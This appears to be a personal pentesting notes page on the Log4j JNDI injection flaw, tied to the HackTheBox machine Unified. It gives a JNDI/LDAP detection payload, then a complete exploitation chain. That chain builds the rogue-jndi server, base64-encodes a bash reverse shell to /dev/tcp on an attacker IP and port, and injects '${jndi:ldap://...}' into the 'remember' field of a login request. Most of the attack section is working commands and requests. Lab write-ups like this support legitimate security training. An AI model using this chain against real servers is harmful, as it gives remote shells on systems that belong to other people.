---
title: Log4j
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - web pentesting
  - java
  - serialization vulnerability
---

# Log4j

This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection). Log4j is a popular logging library for Java created in 2001. The logging library's main purpose is to provide developers with a way to change the format and verbosity of logging through configuration files versus code. 

## What it does

What a logging library does, is instead of using print statements, the developer just uses a wrapper around the Logging class or object. So instead of using print(line), the code would look like this:

```
logging.INFO(“Application Started”)
logging.WARN(“File Uploaded”)
logging.DEBUG(“SQL Query Ran”)
```

Then the application has a configuration file which says what log levels (INFO, WARN, DEBUG, etc.) to display. This way when there is a problem with the application, the developer can enable DEBUG mode and instantly get the messages they need to identify the issue.

## Reconnaissance - Proof of Concept

The main way people have been testing if an application is vulnerable is by combining this vulnerability with JNDI.

**Java Naming and Directory Interface (JNDI)** is a Java API that allows clients to discover and look up data and objects via a name. These objects can be stored in different naming or directory services, such as Remote Method Invocation (RMI), Common Object Request Broker Architecture (CORBA), Lightweight Directory Access Protocol (LDAP), or Domain Name Service (DNS). By making calls to this API, applications locate resources and other program objects. A resource is a program object that provides connections to systems, such as database servers and messaging systems.

In other words, JNDI is a simple Java API (such as 'InitialContext.lookup(String name)') that takes just one string parameter, and if this parameter comes from an untrusted source, it could lead to remote code execution via remote class loading.

**LDAP is the acronym forLightweight Directory Access Protocol**, which is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network. The default port that LDAP runs on is port 389.

**Proof of concepts to see if it is vulnerable**:

**1.** Grab the request with the injectable parameter.

**2.** In the injectable parameter, inject something like this:

```
"${jndi:ldap://AtackerIP/whatever}"
```

With [tcpdump](tcpdump.md), check if the request with the payload produces some traffic to your attacker machine:

```bash
sudo tcpdump -i tun0 port 389
# -i: Select interface
# port: indicate the port where traffic is going to be captured. 
```

The tcpdump output shows a connection being received on our machine. This proves that the application is
indeed vulnerable since it is trying to connect back to us on the LDAP port 389.

## Exploitation

```
# Install Open-JDK and Maven as requirement
sudo apt install openjdk-11-jre maven

git clone https://github.com/veracode-research/rogue-jndi 

cd rogue-jndi

mvn package

# Once it's build, make a reverse shell in base64 with attacker machine and listening port
echo 'bash -c bash -i >&/dev/tcp/AtackerIP/AtackerPort 0>&1' | base64
# This will return something similar to this: YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK
 
# Get out of rogue-jndi folder and
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "10.129.96.149"
# In the bash command, copy paste your reverse shell in base64
# --hostname: Victim IP

# Now, open a terminal, launch netcat abd the listening port you defined in your payload.
```

With Burpsuite, get a request for login:

```
POST /api/login HTTP/1.1
Host: 10.129.96.149:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.129.96.149:8443/manage/account/login
Content-Type: application/json; charset=utf-8
Origin: https://10.129.96.149:8443
Content-Length: 104
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"username":"lala","password":"lele","remember":false,"strict":true}
```

This request is from [HackTheBox machine: Unified](htb-unified.md). As we can read from the Unifi version exploit, the injectable parameter is "remember". So we insert there our payload and with Repeater, send the request:


```
POST /api/login HTTP/1.1
Host: 10.129.96.149:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.129.96.149:8443/manage/account/login
Content-Type: application/json; charset=utf-8
Origin: https://10.129.96.149:8443
Content-Length: 104
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"username":"lala","password":"lele","remember":"${jndi:ldap://10.10.14.2:1389/o=tomcat}","strict":true}
```

Once we send that request, our jndi server will resend the reverse shell:

![jndi server](log4j.md)

And in our terminal with the nc listener we will get the reverse shell.

## Related labs

[Walkthrough HackTheBox machine: Unified](htb-unified.md).


